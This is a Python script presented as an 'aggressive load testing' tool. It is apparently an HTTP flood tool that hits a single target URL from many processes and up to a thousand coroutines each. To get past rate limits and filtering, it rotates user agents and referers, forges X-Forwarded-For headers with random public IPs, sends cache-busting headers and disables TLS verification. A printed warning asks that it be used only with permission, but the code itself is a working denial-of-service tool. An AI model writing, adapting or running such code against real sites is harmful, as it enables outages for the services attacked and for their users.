import asyncio
import random
import time
import os
import argparse
from multiprocessing import Process, cpu_count, Value
from ctypes import c_ulonglong
from httpx import AsyncClient, Limits, Timeout, ConnectError, ReadTimeout, WriteTimeout, PoolTimeout

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://www.youtube.com/",
    "https://www.reddit.com/",
    "https://www.linkedin.com/",
    "https://www.instagram.com/",
    "https://www.pinterest.com/",
    "https://www.tumblr.com/",
    "https://www.wikipedia.org/",
    "https://www.yahoo.com/",
    "https://www.baidu.com/",
    "https://duckduckgo.com/",
    "https://www.quora.com/",
    "https://www.tiktok.com/",
    "https://www.twitch.tv/",
    "https://www.amazon.com/",
    "https://www.ebay.com/",
    "https://www.netflix.com/",
    "https://www.spotify.com/",
    "https://www.discord.com/",
    "https://www.slack.com/",
    "https://www.medium.com/",
    "https://stackoverflow.com/",
    "https://github.com/",
    "https://gitlab.com/",
    "https://www.wordpress.com/",
    "https://www.blogger.com/",
    "https://www.weibo.com/",
    "https://www.vk.com/",
    "https://www.whatsapp.com/",
    "https://www.telegram.org/",
    "https://www.signal.org/",
    "https://www.zoom.us/",
    "https://www.skype.com/",
    "https://www.microsoft.com/",
    "https://www.apple.com/",
    "https://www.adobe.com/",
    "https://www.cloudflare.com/",
    "https://www.mozilla.org/",
    "https://www.opera.com/",
    "https://www.brave.com/",
    "https://www.etsy.com/",
    "https://www.aliexpress.com/",
    "https://www.alibaba.com/",
    "https://www.cnn.com/",
    "https://www.bbc.com/",
    "https://www.nytimes.com/",
    "https://www.theguardian.com/",
    "https://www.reuters.com/",
    "https://www.bloomberg.com/",
    "https://www.forbes.com/",
    "https://www.wired.com/",
    "https://www.techcrunch.com/",
    "https://www.mashable.com/",
    "https://www.gizmodo.com/",
    "https://www.engadget.com/",
    "https://www.cnet.com/",
    "https://www.theverge.com/",
    "https://www.espn.com/",
    "https://www.nba.com/",
    "https://www.fifa.com/",
    "https://www.olympics.com/",
    "https://www.imdb.com/",
    "https://www.rottentomatoes.com/",
    "https://www.metacritic.com/",
    "https://www.fandom.com/",
    "https://www.deviantart.com/",
    "https://www.behance.net/",
    "https://www.dribbble.com/",
    "https://www.figma.com/",
    "https://www.canva.com/",
    "https://www.trello.com/",
    "https://www.notion.so/",
    "https://www.dropbox.com/",
    "https://www.box.com/",
    "https://www.mediafire.com/",
    "https://www.mega.nz/",
    "https://www.icloud.com/",
    "https://www.onedrive.com/",
    "https://www.google.com/maps/",
    "https://www.openstreetmap.org/",
    "https://www.waze.com/",
    "https://www.uber.com/",
    "https://www.lyft.com/",
    "https://www.grab.com/",
    "https://www.deliveroo.com/",
    "https://www.ubereats.com/",
    "https://www.doordash.com/",
    "https://www.airbnb.com/",
    "https://www.booking.com/",
    "https://www.tripadvisor.com/",
    "https://www.expedia.com/",
    "https://www.kayak.com/",
    "https://www.agoda.com/",
    "https://www.healthline.com/",
    "https://www.webmd.com/",
    "https://www.mayoclinic.org/",
    "https://www.nih.gov/",
    "https://www.who.int/",
    "https://www.cdc.gov/",
]

ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "application/json, text/plain, */*",
    "*/*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json",
    "application/json;charset=UTF-8",
    "application/vnd.api+json",
    "application/x-www-form-urlencoded",
    "image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
    "application/octet-stream",
    "text/plain",
    "text/csv",
    "text/tab-separated-values",
    "application/msword",
    "application/vnd.ms-excel",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    "multipart/form-data",
    "application/pdf",
    "application/ld+json"
]

def load_user_agents(filename: str) -> list:
    default_ua = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    ]
    if not filename or not os.path.exists(filename):
        return default_ua
    try:
        with open(filename, "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]
            return lines if lines else default_ua
    except Exception:
        return default_ua

def random_ip() -> str:
    parts = [str(random.randint(1, 254)) for _ in range(4)]
    while parts[0] in ['10', '127'] or \
          (parts[0] == '172' and 16 <= int(parts[1]) <= 31) or \
          (parts[0] == '192' and parts[1] == '168'):
         parts = [str(random.randint(1, 223)) for _ in range(4)]
    return ".".join(parts)

def random_headers(user_agents: list) -> dict:
    return {
        "User-Agent": random.choice(user_agents),
        "Referer": random.choice(REFERERS),
        "X-Forwarded-For": random_ip(),
        "Accept": random.choice(ACCEPT_HEADERS),
        "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "TE": "trailers",
    }

async def make_request(client: AsyncClient, url: str, user_agents: list, success_counter, retries: int = 2):
    for _attempt in range(retries):
        try:
            response = await client.get(url, headers=random_headers(user_agents))
            response.raise_for_status()
            with success_counter.get_lock():
                success_counter.value += 1
            return True
        except (ConnectError, ReadTimeout, WriteTimeout, PoolTimeout):
            if _attempt == retries - 1:
                return False
            await asyncio.sleep(0.01)
        except Exception:
            return False
    return False

async def attack_worker(url: str, end_time: float, client: AsyncClient, user_agents: list, sem: asyncio.Semaphore, success_counter):
    while time.time() < end_time:
        async with sem:
            await make_request(client, url, user_agents, success_counter)
            await asyncio.sleep(random.uniform(0.001, 0.01))

async def process_main(url: str, duration: int, threads: int, concurrency: int, user_agents: list, success_counter):
    pid = os.getpid()
    sem = asyncio.Semaphore(concurrency)
    limits = Limits(
        max_keepalive_connections=concurrency,
        max_connections=concurrency + 50,
        keepalive_expiry=60.0
    )
    timeout = Timeout(10.0, connect=5.0)

    try:
        async with AsyncClient(
            http2=True,
            limits=limits,
            timeout=timeout,
            verify=False,
        ) as client:
            end_time = time.time() + duration
            tasks = [
                attack_worker(url, end_time, client, user_agents, sem, success_counter)
                for _ in range(threads)
            ]
            await asyncio.gather(*tasks)
    except Exception:
        pass
    finally:
        pass

def run_process_wrapper(url, duration, threads, concurrency, user_agents, success_counter):
    try:
        asyncio.run(process_main(url, duration, threads, concurrency, user_agents, success_counter))
    except KeyboardInterrupt:
        pass
    except Exception:
        pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Aggressive Python Load Testing Script.")
    parser.add_argument("url", help="Target URL to test.")
    parser.add_argument("-d", "--duration", type=int, default=120, help="Test duration in seconds.")
    parser.add_argument("-p", "--processes", type=int, default=cpu_count(), help="Number of processes (default: CPU count).")
    parser.add_argument("-t", "--threads", type=int, default=1000, help="Number of coroutines (threads) per process.")
    parser.add_argument("-c", "--concurrency", type=int, default=500, help="Number of concurrent requests per process.")
    parser.add_argument("-ua", "--user_agents", default="./ua.txt", help="Path to User-Agent file.")

    args = parser.parse_args()

    if args.concurrency > args.threads:
        args.concurrency = args.threads

    print("="*70)
    print("      💀 CRITICAL WARNING: THIS SCRIPT IS EXTREMELY POWERFUL & POTENTIALLY HARMFUL 💀")
    print("      USE ONLY ON YOUR OWN INFRASTRUCTURE & WITH EXPLICIT PERMISSION!")
    print("      ENSURE YOU HAVE INCREASED ULIMIT -n (FILE DESCRIPTOR LIMIT)!")
    print("="*70)
    print(f"[*] Target URL : {args.url}")
    print(f"[*] Duration   : {args.duration} seconds")
    print(f"[*] Processes  : {args.processes}")
    print(f"[*] Threads/Proc: {args.threads}")
    print(f"[*] Concurrency: {args.concurrency}")
    print(f"[*] UA File    : {args.user_agents}")
    print(f"[*] Total Est. : {args.processes * args.threads} Threads | {args.processes * args.concurrency} Concurrent Connections")
    print("-"*70)

    user_agents_list = load_user_agents(args.user_agents)

    if not user_agents_list:
        exit(1)


    time.sleep(5)

    success_counter = Value(c_ulonglong, 0)
    processes_list = []
    start_time_global = time.time()

    try:
        for _ in range(args.processes):
            p = Process(
                target=run_process_wrapper,
                args=(args.url, args.duration, args.threads, args.concurrency, user_agents_list, success_counter)
            )
            processes_list.append(p)
            p.start()


        while any(p.is_alive() for p in processes_list):
            elapsed_time = time.time() - start_time_global
            if elapsed_time > args.duration + 5:
                raise KeyboardInterrupt

            current_requests = success_counter.value
            rps = current_requests / elapsed_time if elapsed_time > 0 else 0
            print(f"\r[*] Time: {int(elapsed_time):03d}s | Requests: {current_requests:,} | RPS: {rps:,.1f}   ", end="")
            time.sleep(1)

    except KeyboardInterrupt:
        pass

    finally:
        for p_item in processes_list:
            if p_item.is_alive():
                p_item.terminate()
        
        time.sleep(2)

        for p_item in processes_list:
            if p_item.is_alive():
                p_item.kill()
        
        end_time_global = time.time()
        total_time = end_time_global - start_time_global
        total_requests = success_counter.value
        avg_rps = total_requests / total_time if total_time > 0 else 0

        print("-" * 70)
        print("[*] Test Completed.")
        print(f"[*] Total Time   : {total_time:.2f} seconds")
        print(f"[*] Total Requests: {total_requests:,}")
        print(f"[*] Average RPS  : {avg_rps:,.2f}")
        print("-" * 70)

